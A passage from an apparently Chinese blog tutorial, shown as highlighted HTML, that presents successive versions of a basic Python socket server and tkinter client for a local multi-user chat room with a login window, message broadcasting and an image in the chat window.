client.recv(2048).decode('utf-8').split(',')</span>    <span class="token comment"># UserList.insert(0, '------当前用户列表------')</span>    <span class="token comment"># 窗口标题</span>    <span class="token comment"># nickname = UserList[len(UserList)-1]</span>    root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'一起来聊天 · '</span> <span class="token operator">+</span> nickname<span class="token punctuation">)</span>    <span class="token comment"># name_text = StringVar()</span>    <span class="token comment"># name_text.set(UserList)  # 用户列表文本设置</span>    <span class="token comment"># listbox1 = Listbox(root, listvariable=name_text)  # 用户列表，使用Listbox组件</span>    <span class="token comment"># listbox1.place(x=5, y=0, width=500, height=400)</span>    <span class="token comment">#聊天界面</span>    content <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    ChatBox <span class="token operator">=</span> scrolledtext<span class="token punctuation">.</span>ScrolledText<span class="token punctuation">(</span>root<span class="token punctuation">)</span>  <span class="token comment"># 聊天信息窗口，使用ScrolledText组件制作</span>    ChatBox<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">)</span>    <span class="token comment"># ChatBox.pack()</span>    ChatBox<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">read_server</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            ChatBox<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token operator">+</span>content<span class="token operator">+</span><span class="token string">'\n\n'</span><span class="token punctuation">)</span>            ChatBox<span class="token punctuation">.</span>see<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">)</span>  <span class="token comment"># ScrolledText组件方法，自动定位到结尾，否则只有消息在涨，窗口拖动条不动</span>            ChatBox<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 更新聊天信息窗口，显示新的信息</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read_server<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#聊天输入框</span>    word <span class="token operator">=</span> StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>    word<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    SentBox <span class="token operator">=</span> Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">140</span><span class="token punctuation">,</span>textvariable<span class="token operator">=</span>word<span class="token punctuation">)</span> <span class="token comment">#建一个输入框</span>    SentBox<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">305</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">600</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">95</span><span class="token punctuation">)</span> <span class="token comment">#设置大小和位置</span>    <span class="token comment">#发送按钮</span>    <span class="token keyword">def</span> <span class="token function">sendtext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content <span class="token operator">=</span> word<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获得文本内容</span>        <span class="token keyword">if</span> content<span class="token operator">==</span><span class="token string">'end'</span><span class="token punctuation">:</span>            client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        word<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment">#用了一个标记记录点击的状态，不管内容是什么点了就变</span>    sendButton <span class="token operator">=</span> Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'发 送'</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bg<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span> command<span class="token operator">=</span>sendtext<span class="token punctuation">)</span>    sendButton<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">305</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">150</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">95</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>LoginWindow<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0-67"><a href="#0-67" class="headerlink" title="0.67"></a><strong>0.67</strong></h3><p><strong>作用：0.65上改了点细节（可视化界面加了个图片），先能用……要解决子线程关闭问题</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#服务器</span><span class="token comment">#服务端</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threadinghost <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取当前主机的IP地址</span>port <span class="token operator">=</span> <span class="token number">9999</span> <span class="token comment">#设置防火墙开放端口</span>SocketList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储客户端套接字的列表</span>TextList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储聊天记录</span>Nickname <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#存储用户呢称</span>cnt <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment">#当前客户端人数</span><span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建server对象</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#绑定</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#监听</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务器准备就绪！'</span><span class="token punctuation">)</span><span class="token comment">#接收一个客户端连接，及其发送来数据</span><span class="token keyword">def</span> <span class="token function">read_client</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment">#接受客户端发送来的数据</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token comment">#客户端异常，连接失败，则删除该socket</span>        <span class="token comment"># print(str(addr)+'已下线！')</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">'已下线！'</span><span class="token punctuation">)</span>        SocketList<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        Nickname<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>nickname<span class="token punctuation">)</span>        <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>            sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'系统消息：'</span> <span class="token operator">+</span> nickname <span class="token operator">+</span> <span class="token string">'已下线！'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#多线程：将收到的消息发送给所有客户端</span><span class="token keyword">def</span> <span class="token function">send_client</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># s.send((','.join(Nickname)).encode('utf-8')) #将用户列表发送给各客户端</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> read_client<span class="token punctuation">(</span>s<span class="token punctuation">,</span>nickname<span class="token punctuation">)</span> <span class="token comment">#客户端消息</span>            <span class="token keyword">if</span> content <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span> <span class="token comment">#如果没有结束循环</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment">#如果有将消息保存到历史记录</span>                <span class="token comment"># TextList.append(str(addr)+': '+content)</span>                TextList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> content<span class="token punctuation">)</span>            <span class="token comment">#将一个客户端发送过来的数据广播给其他客户端</span>            <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>                <span class="token comment"># sock.send((str(addr)+': '+content).encode('utf-8'))</span>                sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> content<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token comment"># print(repr())</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'广播未成功！'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    client<span class="token punctuation">,</span>addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    SocketList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>client<span class="token punctuation">)</span>    nickname <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token comment"># print(str(addr)+'已加入！')</span>    <span class="token keyword">if</span> nickname <span class="token keyword">in</span> Nickname<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> nickname<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">in</span> Nickname<span class="token punctuation">:</span>                i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                nickname <span class="token operator">=</span> nickname <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">break</span>    Nickname<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nickname<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>nickname <span class="token operator">+</span> <span class="token string">'已加入！'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> sock <span class="token keyword">in</span> SocketList<span class="token punctuation">:</span>        sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'系统消息：'</span> <span class="token operator">+</span> nickname <span class="token operator">+</span> <span class="token string">'已加入！'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># #历史消息生成</span>    <span class="token comment"># if len(TextList)==0:</span>    <span class="token comment">#     client.send('No message.'.encode('utf-8'))</span>    <span class="token comment"># else:</span>    <span class="token comment">#     client.send('\n'.join(TextList).encode('utf-8'))</span>    cnt <span class="token operator">=</span> cnt <span class="token operator">+</span> <span class="token number">1</span>    <span class="token comment">#每当有客户连接后，就启动一个线程为其服务</span>    <span class="token comment">#加入线程中跑，加入函数为send_client，参数为client,nickname</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>send_client<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span>nickname<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#客户端</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threading<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>messagebox <span class="token comment">#弹窗库</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> scrolledtext  <span class="token comment">#滚动文本框</span>server_host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span>server_port <span class="token operator">=</span> <span class="token number">9999</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建socket对象</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting......'</span><span class="token punctuation">)</span><span class="token comment">#登入窗口：输入呢称</span><span class="token keyword">def</span> <span class="token function">LoginWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'一起来聊天 · 登录'</span><span class="token punctuation">)</span> <span class="token comment">#窗口标题</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'300x150'</span><span class="token punctuation">)</span> <span class="token comment">#窗口大小</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'+500+300'</span><span class="token punctuation">)</span> <span class="token comment">#改变窗体位置（‘+横坐标+纵坐标’）</span>    nickname <span class="token operator">=</span> StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#昵称变量（对象）:在使用界面编程的时候，有些时候是需要跟踪变量的值的变化，以保证值的变更随时可以显示在界面上</span>    root<span class="token punctuation">.</span>resizable<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#将窗口大小设置为不可变</span>    <span class="token comment">#登录函数（检查用户名是否为空，以及长度）</span>    <span class="token keyword">def</span> <span class="token function">Login_in</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> nickname<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#????</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> name<span class="token punctuation">:</span>            tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showwarning<span class="token punctuation">(</span><span class="token string">'Warning'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'用户名为空！'</span><span class="token punctuation">)</span> <span class="token comment">#消息警告框</span>        <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showwarning<span class="token punctuation">(</span><span class="token string">'Warning'</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'用户名过长！最多为十个字符！'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            root<span class="token punctuation">.</span>destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>server_host<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 连接服务端，指定主机和端口</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting is successful!'</span><span class="token punctuation">)</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 传递用户昵称</span>            ChatRoom<span class="token punctuation">(</span>name<span class="token punctuation">)</span>  <span class="token comment"># 打开聊天窗口</span>    <span class="token comment">#登录按钮、输入提示标签、输入框</span>    Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"登录"</span><span class="token punctuation">,</span> command<span class="token operator">=</span>Login_in<span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">35</span><span class="token punctuation">)</span>    Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'请输入昵称'</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span>    Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span> textvariable<span class="token operator">=</span>nickname<span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">180</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#聊天窗口</span><span class="token keyword">def</span> <span class="token function">ChatRoom</span><span class="token punctuation">(</span>nickname<span class="token punctuation">)</span><span class="token punctuation">:</span>    root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'650x400'</span><span class="token punctuation">)</span>  <span class="token comment"># 窗口大小</span>    root<span class="token punctuation">.</span>resizable<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 将窗口大小设置为不可变</span>    root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'+500+300'</span><span class="token punctuation">)</span>  <span class="token comment"># 改变窗体位置（‘+横坐标+纵坐标’）</span>    <span class="token comment"># content = client.recv(2048).decode('utf-8')</span>    <span class="token comment"># if content != 'No message.':</span>    <span class="token comment">#     past_text = content + '\n------以上是历史消息------\n'</span>    <span class="token comment"># 从服务器端获取当前用户列表</span>    <span class="token comment"># UserList = []</span>    <span class="token comment"># UserList = client.recv(2048).decode('utf-8').split(',')</span>    <span class="token comment"># UserList.insert(0, '------当前用户列表------')</span>    <span class="token comment"># 窗口标题</span>    <span class="token comment"># nickname = UserList[len(UserList)-1]</span>    root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'一起来聊天 · '</span> <span class="token operator">+</span> nickname<span class="token punctuation">)</span>    <span class="token comment"># name_text = StringVar()</span>    <span class="token comment"># name_text.set(UserList)  # 用户列表文本设置</span>    <span class="token comment"># listbox1 = Listbox(root, listvariable=name_text)  # 用户列表，使用Listbox组件</span>    <span class="token comment"># listbox1.place(x=5, y=0, width=500, height=400)</span>    img_png <span class="token operator">=</span> PhotoImage<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'QQ图片20220901201640.png'</span><span class="token punctuation">)</span>    label_img <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> image<span class="token operator">=</span>img_png<span class="token punctuation">)</span>    label_img<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">400</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">350</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">)</span>    <span class="token comment">#聊天界面</span>    content <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    ChatBox <span class="token operator">=</span> scrolledtext<span class="token punctuation">.</span>ScrolledText<span class="token punctuation">(</span>root<span class="token punctuation">)</span>  <span class="token comment"># 聊天信息窗口，使用ScrolledText组件制作</span>    ChatBox<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">470</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">)</span>    <span class="token comment"># ChatBox.pack()</span>    ChatBox<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">read_server</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            content <span class="token operator">=</span> c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            ChatBox<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token operator">+</span>content<span class="token operator">+</span><span class="token string">'\n\n'</span><span class="token punctuation">)</span>            ChatBox<span class="token punctuation">.</span>see<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">)</span>  <span class="token comment"># ScrolledText组件方法，自动定位到结尾，否则只有消息在涨，窗口拖动条不动</span>            ChatBox<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 更新聊天信息窗口，显示新的信息</span>    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read_server<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#聊天输入框</span>    word <span class="token operator">=</span> StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>    word<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    SentBox <span class="token operator">=</span> Entry<span class="token punctuation">(</span>root<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">140</span><span class="token punctuation">,</span>textvariable<span class="token operator">=</span>word<span class="token punctuation">)</span> <span class="token comment">#建一个输入框</span>    SentBox<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">305</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">475</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">)</span> <span class="token comment">#设置大小和位置</span>    <span class="token comment">#发送按钮</span>    <span class="token keyword">def</span> <span class="token function">sendtext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content <span class="token operator">=</span> word<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获得文本内容</span>        <span class="token keyword">if</span> content<span class="token operator">==</span><span class="token string">'end'</span><span class="token punctuation">:</span>            client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        word<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment">#用了一个标记记录点击的状态，不管内容是什么点了就变</span>    sendButton <span class="token operator">=</span> Button<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'发 送'</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Fangsong'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bg<span class="token operator">=</span><span class="token string">'white'</span><span class="token punctuation">,</span> command<span class="token operator">=</span>sendtext<span class="token punctuation">)</span>    sendButton<span class="token punctuation">.</span>place<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">490</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">308</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">150</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">85</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>LoginWindow<span class="token punctuation">(</span><span class="token 